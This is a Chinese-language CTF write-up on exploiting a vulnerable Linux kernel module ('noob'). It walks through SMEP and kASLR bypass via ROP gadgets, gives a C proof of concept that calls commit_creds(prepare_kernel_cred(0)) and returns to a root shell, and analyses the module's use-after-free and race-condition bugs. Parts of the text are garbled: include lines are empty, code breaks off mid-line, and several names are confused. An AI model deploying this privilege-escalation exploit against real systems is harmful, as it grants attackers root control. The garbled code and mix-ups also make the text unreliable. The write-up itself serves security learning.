那么绕过`SEMP`的思路还可以使用我们之前所述的思路，首先导出并寻找可用的`gadget`
    0xffffffff81004d70 : mov cr4, rdi ; pop rbp ; ret
    0xffffffff8109054d : pop rdi ; ret
我们找到了这两个`gadget`之后还要想办法绕过开启的`kASLR`保护，这将导致我们无法得知这几个`gadget`的真实地址。
我们可以在启动`QEMU`时，暂时关闭`kASLR`，然后我们就可以得到程序返回地址的真实值。(将启动参数里的`kaslr`修改为`nokaslr`)
也就是`0xffffffff81219218`。
接下来我们开启`kASLR`，再次获取相同位置的值，然后我们可以得到如下计算公式：
    0xffffffff81219218 + 固定offset = 获取到的随机加载地址
    任意函数的物理地址 + 固定offset = 任意函数的实际加载地址
    任意函数的物理地址 + 获取到的随机加载地址 - 0xffffffff81219218 = 任意函数的实际加载地址
那么我们可以构造如下PoC:
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    uint64_t u64(char * s){
        uint64_t result = 0;
        for (int i = 7 ; i >=0 ;i--){
            result = (result 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    struct trap_frame{
        void *rip;
        uint64_t cs;
        uint64_t rflags;
        void * rsp;
        uint64_t ss;
    }__attribute__((packed));
    struct trap_frame tf;
    void launch_shell(){
        execl("/bin/sh","sh",NULL);
    }
    void save_status(){
        asm(
            "mov %%cs,  %0n"
            "mov %%ss,  %1n"
            "mov %%rsp, %3n"
            "pushfqn"
            "popq %2" :"=r"(tf.cs),"=r"(tf.ss),"=r"(tf.rflags),"=r"(tf.rsp) :
            :"memory"
        );
        tf.rsp -= 4096;
        tf.rip = &launch_shell;
    }
    uint64_t (*commit_creds)(uint64_t cred) ;
    uint64_t (*prepare_kernel_cred)(uint64_t cred) ;
    void payload(void){
        commit_creds(prepare_kernel_cred(0));
        asm("movq $tf, %rspn"
            "swapgsn"
            "iretqn");
    }
    uint64_t u64(char * s){
        uint64_t result = 0;
        for (int i = 7 ; i >=0 ;i--){
            result = (result  /proc/sys/kernel/dmesg_restrict
    echo 1 > /proc/sys/kernel/kptr_restrict
    cd /home/pwn
    setsid /bin/cttyhack setuidgid 1000 sh
    umount /proc
    poweroff -f
我们可以看到，程序对`/proc/sys/kernel/dmesg_restrict`和`/proc/sys/kernel/dmesg_restrict`这两个文件进行了操作。
#### 关于`/proc/sys/kernel/dmesg_restrict`
这里我们引用 [kernel
docs](https://www.kernel.org/doc/Documentation/sysctl/kernel.txt) 中的内容：
    This toggle indicates whether unprivileged users are prevented from using dmesg(8) to view messages from the kernel’s log buffer. When dmesg_restrict is set to (0) there are no restrictions. When dmesg_restrict is set set to (1), users must have CAP_SYSLOG to use dmesg(8). The kernel config option CONFIG_SECURITY_DMESG_RESTRICT sets the default value of dmesg_restrict.
可以发现，当`/proc/sys/kernel/dmesg_restrict`为1时，将不允许用户使用`dmesg`命令。
#### 关于`/proc/sys/kernel/kptr_restrict`
这里我们引用[lib/vsprintf.c](https://elixir.bootlin.com/linux/v4.4.72/source/lib/vsprintf.c)中的内容：
    case 'K':
            /*
             * %pK cannot be used in IRQ context because its test
             * for CAP_SYSLOG would be meaningless.
             */
            if (kptr_restrict && (in_irq() || in_serving_softirq() ||
                          in_nmi())) {
                if (spec.field_width == -1)
                    spec.field_width = default_width;
                return string(buf, end, "pK-error", spec);
            }
            switch (kptr_restrict) {
            case 0:
                /* Always print %pK values */
                break;
            case 1: {
                /*
                 * Only print the real pointer value if the current
                 * process has CAP_SYSLOG and is running with the
                 * same credentials it started with. This is because
                 * access to files is checked at open() time, but %pK
                 * checks permission at read() time. We don't want to
                 * leak pointer values if a binary opens a file using
                 * %pK and then elevates privileges before reading it.
                 */
                const struct cred *cred = current_cred();
                if (!has_capability_noaudit(current, CAP_SYSLOG) ||
                    !uid_eq(cred->euid, cred->uid) ||
                    !gid_eq(cred->egid, cred->gid))
                    ptr = NULL;
                break;
            }
            case 2:
            default:
                /* Always print 0's for %pK */
                ptr = NULL;
                break;
            }
            break;
可以发现，当`/proc/sys/kernel/dmesg_restrict`为0时，将允许任何用户查看`/proc/kallsyms`。
当`/proc/sys/kernel/dmesg_restrict`为1时，仅允许root用户查看`/proc/kallsyms`。
当`/proc/sys/kernel/dmesg_restrict`为2时，不允许任何用户查看`/proc/kallsyms`。
####  修改Init文件
那么此处我们为了调试方便，我们将上述的Init文件修改为：
    #!/bin/sh
    echo "ERROR404 Hacked!"
    mount -t proc none /proc
    mount -t devtmpfs none /dev
    mkdir /dev/pts
    mount /dev/pts
    insmod /home/pwn/noob.ko
    chmod 666 /dev/noob
    echo 0 > /proc/sys/kernel/dmesg_restrict
    echo 0 > /proc/sys/kernel/kptr_restrict
    echo 1 >/proc/sys/kernel/perf_event_paranoid
    cd /home/pwn
    setsid /bin/cttyhack setuidgid 1000 sh
    umount /proc
    poweroff -f
并重打包文件系统。
###  调试信息
`QEMU`启动指令：
    qemu-system-x86_64 
    -s 
    -m 128M 
    -nographic 
    -kernel bzImage 
    -append 'console=ttyS0 loglevel=3 pti=off oops=panic panic=1 nokaslr' 
    -monitor /dev/null 
    -initrd initramfs.cpio 
    -smp 2,cores=2,threads=1 
    -cpu qemu64,smep 2>/dev/null
本题依然没有给出共享文件夹，因此仍需要在利用时重打包文件系统。
Kernel开启了`SEMP`保护。
我们可以使用如下命令获取程序的加载地址`grep noob /proc/kallsyms`。
    ~ $ grep noob /proc/kallsyms
    ffffffffc0002000 t copy_overflow    [noob]
    ffffffffc0003120 r kernel_read_file_str    [noob]
    ffffffffc0002043 t add_note    [noob]
    ffffffffc000211c t del_note    [noob]
    ffffffffc0002180 t show_note    [noob]
    ffffffffc00022d8 t edit_note    [noob]
    ffffffffc0002431 t noob_ioctl    [noob]
    ffffffffc0004000 d fops    [noob]
    ffffffffc0004100 d misc    [noob]
    ffffffffc0003078 r .LC1    [noob]
    ffffffffc00044c0 b pool    [noob]
    ffffffffc0004180 d __this_module    [noob]
    ffffffffc00024f2 t cleanup_module    [noob]
    ffffffffc00024ca t init_module    [noob]
    ffffffffc00024f2 t noob_exit    [noob]
    ffffffffc00024ca t noob_init    [noob]
由此可以看出以下地址
    .text : 0xffffffffc0002000
    .data : 0xffffffffc0004000
    .bss  : 0xffffffffc00044C0
    # code in gdb
    set architecture i386:x86-64:intel
    add-symbol-file noob.ko 0xffffffffc0002000 -s .data 0xffffffffc0004000 -s .bss 0xffffffffc00044C0
###  LKMs文件分析
####  题目逻辑分析
#####  babyhacker_ioctl
程序定义了四个命令码`0x30000`、`0x30001`、`0x30002`、`0x30003`，并且程序对于参数寻址时采用的方式是指针方式，因此我们向`ioctl`应当传入的的是一个结构体。
    struct IO {
        uint64_t index;
        void *buf;
        uint64_t size;
    };
    IO io;
在`0x30000`命令码下，程序会调用`add_note`函数，将会在全局变量`Chunk_list`的`io -> index`的位置分配一个`io
-> size`大小的`Chunk`，`io ->
size`将会存储在全局变量`Chunk_size_list`中，此处`Chunk_list`和`Chunk_size_list`呈交错存在。
在`0x30001`命令码下，程序会调用`del_note`函数，将会释放`Chunk_list`的`io -> index`的位置的`Chunk`。
在`0x30002`命令码下，程序会调用`edit_note`函数，进行`Chunk_list`的`io ->
index`的位置的`Chunk`合法性检查且保证`io -> size`小于等于`Chunk_size_list`的`io ->
index`的位置的值后将会调用`copy_from_user(chunk,io -> buf, io ->
size);`从`buf`向`Chunk`内写值。
在`0x30003`命令码下，程序会调用`show_note`函数，进行`Chunk_list`的`io ->
index`的位置的`Chunk`合法性检查且保证`io -> size`小于等于`Chunk_size_list`的`io ->
index`的位置的值后将会调用`copy_to_user(io -> buf,chunk, io -> size);`从`Chunk`向`buf`内写值。
####  题目漏洞分析
首先，程序在调用`kfree`释放堆块后并没有执行data段对应位置的清零，这将导致`Use-After-Free`漏洞的发生。
然后，本设备涉及到了对全局变量的读写，且没有做加锁保护，这将导致`Race
Condition`(条件竞争)漏洞的发生，即多次打开相同设备，他们将共享全局变量区域。
#####  分配任意地址大小的Chunk
由于条件竞争的存在，我们可以轻松绕过`add_note`函数里的`size`检查，程序里的size检查形如这样
    if ( arg[2] > 0x70 || arg[2]  size`是否大于0x70，再判断`io ->
size`是否小于等于0x1F，如果我们创建一个并发进程，同时尝试把`io ->
size`的值刷新为`0xA0`(此处我们假设要分配的大小为`0xA0`)的一个”叠加态”，那么一定存在一个这样的情况，当进行`io ->
size`是否小于等于0x70的判断时，`io -> size`的值还未被刷新，当进行`io -> size`是否大于0x1F的判断时，`io ->
size`被刷新为了`0x1F`，这样就通过了保护。
**注意：我们在设定`io -> size`的初值时，一定要小于0x1F，否则可能会发生直到`Chunk`分配结束`io ->
size`都没有被刷新的情况发生。**
我们首先构建如下PoC来测试：
    #include 